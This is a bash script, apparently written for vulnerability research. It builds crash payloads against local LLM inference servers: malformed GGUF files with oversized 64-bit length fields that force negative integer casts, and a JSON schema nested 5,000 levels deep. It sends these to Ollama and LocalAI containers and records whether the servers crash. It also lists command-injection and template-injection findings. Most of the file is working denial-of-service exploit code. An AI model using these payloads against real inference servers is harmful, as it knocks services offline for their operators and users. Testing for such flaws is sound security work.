#!/bin/bash
# Cross-framework vulnerability pattern testing
# Tests each discovered pattern against ALL frameworks
set +e  # Don't abort on errors — we need to check each test result

DIR="$(cd "$(dirname "$0")" && pwd)"
OLLAMA_PORT=11460
LOCALAI_PORT=11480

echo "=============================================="
echo "Cross-Framework Vulnerability Pattern Testing"
echo "=============================================="
echo ""
echo "Patterns to test:"
echo "  P1: uint64->int GGUF cast (CWE-681) — found in Ollama"
echo "  P2: JSON schema recursion (CWE-674) — found in llama.cpp"
echo ""

RESULTS=()

# ──────────────────────────────────────────────────────────────
# Setup: Generate test payloads
# ──────────────────────────────────────────────────────────────
echo "[Setup] Generating test payloads..."
mkdir -p "$DIR/payloads"

# P1: GGUF with uint64→int negative cast (same as Ollama LIMA-NEW-001)
python3 - "$DIR/payloads" << 'PYEOF'
import struct, sys, os
outdir = sys.argv[1]

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

def write_string(f, s):
    b = s.encode("utf-8")
    f.write(struct.pack("<Q", len(b)))
    f.write(b)

# P1a: KV key string length = 0x8000000000000000 → negative int
path = os.path.join(outdir, "p1_negative_int_cast.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))   # n_tensors = 0
    f.write(struct.pack("<Q", 1))   # n_kv = 1
    # KV pair with malicious key length
    f.write(struct.pack("<Q", 0x8000000000000000))  # key length → negative int
    f.write(b"A" * 16)  # some bytes
print(f"  Created {path}")

# P1b: KV array count = 0x8000000000000000 → negative make()
path = os.path.join(outdir, "p1_negative_array_len.gguf")
with open(path, "wb") as f:
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", 0))   # n_tensors = 0
    f.write(struct.pack("<Q", 1))   # n_kv = 1
    # KV pair: valid key, then array value with huge count
    write_string(f, "test.array")
    f.write(struct.pack("<I", 9))   # type = GGUF_TYPE_ARRAY
    f.write(struct.pack("<I", 4))   # array element type = UINT32
    f.write(struct.pack("<Q", 0x8000000000000000))  # count → negative int
    f.write(b"\x00" * 16)
print(f"  Created {path}")
PYEOF

# P2: Deeply nested JSON schema (same as llama.cpp LIMA-NEW-004)
python3 -c "
inner = '{\"type\":\"integer\"}'
for _ in range(5000):
    inner = '{\"type\":\"object\",\"properties\":{\"x\":' + inner + '},\"required\":[\"x\"]}'
with open('$DIR/payloads/p2_nested_schema.json', 'w') as f:
    f.write(inner)
print('  Created p2_nested_schema.json')
"

echo "  Payloads ready."
echo ""

# ══════════════════════════════════════════════════════════════
# PATTERN 1: uint64→int GGUF cast — Test on LocalAI
# Already confirmed on Ollama (LIMA-NEW-001/002)
# Already confirmed blocked on llama.cpp b8149
# ══════════════════════════════════════════════════════════════
echo "=============================================="
echo "PATTERN 1: uint64→int GGUF cast → LocalAI v3.12.1"
echo "(Already: Ollama=CRASHED, llama.cpp=BLOCKED)"
echo "=============================================="

# Start LocalAI
echo "Starting LocalAI v3.12.1..."
cd "$DIR/../localai-v3.12.1-retest"
docker compose up -d 2>/dev/null
sleep 20

if ! curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1; then
    if ! curl -sf "http://localhost:$LOCALAI_PORT/v1/models" > /dev/null 2>&1; then
        echo "  ERROR: LocalAI not responding"
        RESULTS+=("P1_LocalAI=SKIPPED")
        docker compose down 2>/dev/null
    fi
fi

if curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1 || \
   curl -sf "http://localhost:$LOCALAI_PORT/v1/models" > /dev/null 2>&1; then

    CONTAINER_LAI=localai-v3121-retest

    # Copy GGUF files into the container — LocalAI resolves model path as
    # modelsPath/modelName, so the GGUF filename must match the model name exactly
    docker cp "$DIR/payloads/p1_negative_int_cast.gguf" $CONTAINER_LAI:/build/models/p1-neg-int 2>/dev/null
    docker cp "$DIR/payloads/p1_negative_array_len.gguf" $CONTAINER_LAI:/build/models/p1-neg-arr 2>/dev/null

    # Also copy host-side so the volume mount has them
    cp "$DIR/payloads/p1_negative_int_cast.gguf" "$DIR/../localai-v3.12.1-retest/models/p1-neg-int" 2>/dev/null || true
    cp "$DIR/payloads/p1_negative_array_len.gguf" "$DIR/../localai-v3.12.1-retest/models/p1-neg-arr" 2>/dev/null || true

    # Test P1a: negative int cast via model apply
    echo ""
    echo "  Test P1a: GGUF with negative int key length..."

    # Create model config — NO parameters.model (LocalAI uses model name as filename)
    docker exec $CONTAINER_LAI sh -c 'cat > /build/models/p1-neg-int.yaml << YAML
name: p1-neg-int
backend: llama-cpp
YAML' 2>/dev/null

    RESP_P1A=$(curl -sf -X POST "http://localhost:$LOCALAI_PORT/v1/chat/completions" \
        -H "Content-Type: application/json" \
        -d '{"model":"p1-neg-int","messages":[{"role":"user","content":"test"}]}' \
        2>&1 || true)
    sleep 5

    # Check if LocalAI survived
    if curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1 || \
       curl -sf "http://localhost:$LOCALAI_PORT/v1/models" > /dev/null 2>&1; then
        echo "  P1a: Server survived"
        echo "  Response: $(echo "$RESP_P1A" | head -c 200)"
        # Check container logs for crash evidence
        CRASH_P1A=$(docker compose logs --tail 20 2>&1 | grep -i -c "panic\|fatal\|signal\|SEGV\|SIGBUS\|SIGSEGV\|runtime error" || true)
        if [ "$CRASH_P1A" -gt 0 ]; then
            echo "  P1a: Backend crash detected in logs!"
            RESULTS+=("P1a_LocalAI_neg_int=BACKEND_CRASH")
        else
            RESULTS+=("P1a_LocalAI_neg_int=NOT_VULNERABLE")
        fi
    else
        echo "  P1a: *** SERVER CRASHED! ***"
        RESULTS+=("P1a_LocalAI_neg_int=VULNERABLE")
        docker compose restart 2>/dev/null
        sleep 20
    fi

    # Test P1b: negative array length
    echo ""
    echo "  Test P1b: GGUF with negative array count..."

    docker exec $CONTAINER_LAI sh -c 'cat > /build/models/p1-neg-arr.yaml << YAML
name: p1-neg-arr
backend: llama-cpp
YAML' 2>/dev/null

    RESP_P1B=$(curl -sf -X POST "http://localhost:$LOCALAI_PORT/v1/chat/completions" \
        -H "Content-Type: application/json" \
        -d '{"model":"p1-neg-arr","messages":[{"role":"user","content":"test"}]}' \
        2>&1 || true)
    sleep 5

    if curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1 || \
       curl -sf "http://localhost:$LOCALAI_PORT/v1/models" > /dev/null 2>&1; then
        echo "  P1b: Server survived"
        echo "  Response: $(echo "$RESP_P1B" | head -c 200)"
        CRASH_P1B=$(docker compose logs --tail 20 2>&1 | grep -i -c "panic\|fatal\|signal\|SEGV\|SIGBUS\|SIGSEGV\|runtime error" || true)
        if [ "$CRASH_P1B" -gt 0 ]; then
            echo "  P1b: Backend crash detected in logs!"
            RESULTS+=("P1b_LocalAI_neg_arr=BACKEND_CRASH")
        else
            RESULTS+=("P1b_LocalAI_neg_arr=NOT_VULNERABLE")
        fi
    else
        echo "  P1b: *** SERVER CRASHED! ***"
        RESULTS+=("P1b_LocalAI_neg_arr=VULNERABLE")
        docker compose restart 2>/dev/null
        sleep 20
    fi

    # Collect logs
    docker compose logs --tail 30 > "$DIR/payloads/p1_localai_logs.txt" 2>&1 || true

    echo ""
    echo "Stopping LocalAI..."
    docker compose down 2>/dev/null
fi

# ══════════════════════════════════════════════════════════════
# PATTERN 2: JSON schema recursion → Ollama v0.17.0
# Already confirmed on llama.cpp b8149 (LIMA-NEW-004)
# Ollama calls same json_schema_to_grammar() via CGo bridge
# ══════════════════════════════════════════════════════════════
echo ""
echo "=============================================="
echo "PATTERN 2: JSON schema recursion → Ollama v0.17.0"
echo "(Already: llama.cpp=CRASHED)"
echo "=============================================="

# Start Ollama
echo "Starting Ollama v0.17.0..."
cd "$DIR/../ollama-v0.17.0-retest"
docker compose up -d 2>/dev/null
sleep 10

if ! curl -sf "http://localhost:$OLLAMA_PORT/api/version" > /dev/null 2>&1; then
    echo "  ERROR: Ollama not responding"
    RESULTS+=("P2_Ollama=SKIPPED")
else
    OLLAMA_VER=$(curl -sf "http://localhost:$OLLAMA_PORT/api/version" | python3 -c "import sys,json; print(json.load(sys.stdin).get('version','?'))" 2>/dev/null || echo "?")
    echo "  Ollama version: $OLLAMA_VER"
    CONTAINER_OLL=ollama-v0170-retest

    # We need a model loaded to test the format parameter.
    # Check if any model is already available
    MODELS=$(curl -sf "http://localhost:$OLLAMA_PORT/api/tags" 2>/dev/null || true)
    HAS_MODEL=$(echo "$MODELS" | python3 -c "import sys,json; m=json.load(sys.stdin).get('models',[]); print('yes' if m else 'no')" 2>/dev/null || echo "no")

    if [ "$HAS_MODEL" = "no" ]; then
        echo "  No model loaded. Pulling tiny model (this may take a moment)..."
        # Pull the smallest available model
        curl -sf -X POST "http://localhost:$OLLAMA_PORT/api/pull" \
            -d '{"name":"tinyllama","stream":false}' \
            --max-time 120 > /dev/null 2>&1 || true
        sleep 5
        # Check again
        HAS_MODEL=$(curl -sf "http://localhost:$OLLAMA_PORT/api/tags" | python3 -c "import sys,json; m=json.load(sys.stdin).get('models',[]); print('yes' if m else 'no')" 2>/dev/null || echo "no")
    fi

    if [ "$HAS_MODEL" = "yes" ]; then
        MODEL_NAME=$(curl -sf "http://localhost:$OLLAMA_PORT/api/tags" | python3 -c "import sys,json; m=json.load(sys.stdin).get('models',[]); print(m[0]['name'] if m else '')" 2>/dev/null || true)
        echo "  Using model: $MODEL_NAME"

        # Test P2: Send deeply nested JSON schema via format parameter
        echo ""
        echo "  Test P2: Deeply nested JSON schema (5000 levels)..."

        # Build request file by concatenating strings (avoids Python recursion limit)
        # The schema is already valid JSON, so we wrap it directly
        python3 - "$DIR/payloads/p2_nested_schema.json" "$DIR/payloads/p2_ollama_request.json" "$MODEL_NAME" << 'BUILDREQ'
import sys
schema_path, out_path, model = sys.argv[1], sys.argv[2], sys.argv[3]
with open(schema_path, 'r') as f:
    schema_str = f.read()
# Build the request JSON by string concatenation (no parsing needed)
req = '{"model":"' + model + '","prompt":"hi","format":' + schema_str + ',"stream":false}'
with open(out_path, 'w') as f:
    f.write(req)
print('  Request payload created (' + str(len(req)) + ' bytes)')
BUILDREQ

        # Send the request
        RESP_P2=$(curl -sf -X POST "http://localhost:$OLLAMA_PORT/api/generate" \
            -H "Content-Type: application/json" \
            -d @"$DIR/payloads/p2_ollama_request.json" \
            --max-time 30 \
            2>&1 || true)
        sleep 5

        # Check if Ollama survived
        if curl -sf "http://localhost:$OLLAMA_PORT/api/version" > /dev/null 2>&1; then
            echo "  P2: Server survived"
            echo "  Response: $(echo "$RESP_P2" | head -c 300)"

            # Check if the LLM subprocess crashed (Ollama main process may survive)
            # Try another simple request to see if inference still works
            RESP_HEALTH=$(curl -sf -X POST "http://localhost:$OLLAMA_PORT/api/generate" \
                -d "{\"model\":\"$MODEL_NAME\",\"prompt\":\"hi\",\"stream\":false}" \
                --max-time 30 2>&1 || true)

            if echo "$RESP_HEALTH" | grep -q "response" 2>/dev/null; then
                echo "  Inference still works after attack"
                RESULTS+=("P2_Ollama_schema_recursion=NOT_VULNERABLE")
            else
                echo "  Inference broken after attack (subprocess may have crashed)"
                echo "  Health response: $(echo "$RESP_HEALTH" | head -c 200)"
                RESULTS+=("P2_Ollama_schema_recursion=POSSIBLE")
            fi
        else
            echo "  P2: *** OLLAMA SERVER CRASHED! ***"
            RESULTS+=("P2_Ollama_schema_recursion=VULNERABLE")
        fi
    else
        echo "  No model available, cannot test JSON schema format"
        RESULTS+=("P2_Ollama=SKIPPED_NO_MODEL")
    fi

    # Collect logs (more lines to capture schema processing output)
    docker compose logs --tail 200 > "$DIR/payloads/p2_ollama_logs.txt" 2>&1 || true
fi

echo ""
echo "Stopping Ollama..."
cd "$DIR/../ollama-v0.17.0-retest"
docker compose down -v 2>/dev/null

# ══════════════════════════════════════════════════════════════
# PATTERN 2: JSON schema recursion → LocalAI v3.12.1
# LocalAI also bundles llama.cpp
# ══════════════════════════════════════════════════════════════
echo ""
echo "=============================================="
echo "PATTERN 2: JSON schema recursion → LocalAI v3.12.1"
echo "=============================================="

echo "Starting LocalAI v3.12.1..."
cd "$DIR/../localai-v3.12.1-retest"
docker compose up -d 2>/dev/null
sleep 20

if curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1 || \
   curl -sf "http://localhost:$LOCALAI_PORT/v1/models" > /dev/null 2>&1; then

    CONTAINER_LAI=localai-v3121-retest

    # LocalAI may process JSON schema in the grammar configuration
    # Try via /v1/chat/completions with response_format
    echo ""
    echo "  Test P2: Deeply nested JSON schema via response_format..."

    # Build request file (avoids shell quoting issues with 270KB JSON)
    python3 - "$DIR/payloads/p2_nested_schema.json" "$DIR/payloads/p2_localai_request.json" << 'BUILDREQ2'
import sys
schema_path, out_path = sys.argv[1], sys.argv[2]
with open(schema_path, 'r') as f:
    schema_str = f.read()
req = '{"model":"gpt-4","messages":[{"role":"user","content":"hi"}],"response_format":{"type":"json_schema","json_schema":{"name":"test","schema":' + schema_str + '}}}'
with open(out_path, 'w') as f:
    f.write(req)
print('  LocalAI request payload created (' + str(len(req)) + ' bytes)')
BUILDREQ2

    RESP_P2L=$(curl -sf -X POST "http://localhost:$LOCALAI_PORT/v1/chat/completions" \
        -H "Content-Type: application/json" \
        --max-time 60 \
        -d @"$DIR/payloads/p2_localai_request.json" \
        2>&1 || true)
    sleep 5

    if curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1 || \
       curl -sf "http://localhost:$LOCALAI_PORT/v1/models" > /dev/null 2>&1; then
        echo "  P2: Server survived"
        echo "  Response: $(echo "$RESP_P2L" | head -c 300)"
        CRASH_P2L=$(docker compose logs --tail 30 2>&1 | grep -i -c "panic\|fatal\|signal\|SEGV\|stack overflow\|runtime error" || true)
        if [ "$CRASH_P2L" -gt 0 ]; then
            echo "  P2: Backend crash detected in logs!"
            RESULTS+=("P2_LocalAI_schema_recursion=BACKEND_CRASH")
        else
            RESULTS+=("P2_LocalAI_schema_recursion=NOT_VULNERABLE")
        fi
    else
        echo "  P2: *** LOCALAI SERVER CRASHED! ***"
        RESULTS+=("P2_LocalAI_schema_recursion=VULNERABLE")
    fi

    docker compose logs --tail 30 > "$DIR/payloads/p2_localai_logs.txt" 2>&1 || true
    docker compose down 2>/dev/null
else
    echo "  ERROR: LocalAI not responding"
    RESULTS+=("P2_LocalAI=SKIPPED")
    docker compose down 2>/dev/null
fi

# ══════════════════════════════════════════════════════════════
# SUMMARY
# ══════════════════════════════════════════════════════════════
echo ""
echo "=============================================="
echo "CROSS-FRAMEWORK RESULTS SUMMARY"
echo "=============================================="
echo ""
echo "Pattern 1: uint64→int GGUF cast (CWE-681)"
echo "  Ollama v0.17.0:    VULNERABLE (LIMA-NEW-001/002)"
echo "  llama.cpp b8149:   NOT_VULNERABLE (hardened)"
for r in "${RESULTS[@]}"; do
    if [[ "$r" == P1* ]]; then
        echo "  $r"
    fi
done
echo ""
echo "Pattern 2: JSON schema recursion (CWE-674)"
echo "  llama.cpp b8149:   VULNERABLE (LIMA-NEW-003/004)"
for r in "${RESULTS[@]}"; do
    if [[ "$r" == P2* ]]; then
        echo "  $r"
    fi
done
echo ""
echo "Pattern 3: MCP command injection (CWE-78)"
echo "  LocalAI v3.12.1:   VULNERABLE (LIMA-NEW-005)"
echo "  Others:            N/A (no MCP support)"
echo ""
echo "Pattern 4: SSTI via Sprig templates (CWE-1336)"
echo "  LocalAI v3.12.1:   VULNERABLE (LIMA-NEW-006)"
echo "  Ollama:            NOT_VULNERABLE (no sprig, safe FuncMap)"
echo ""
echo "Done."
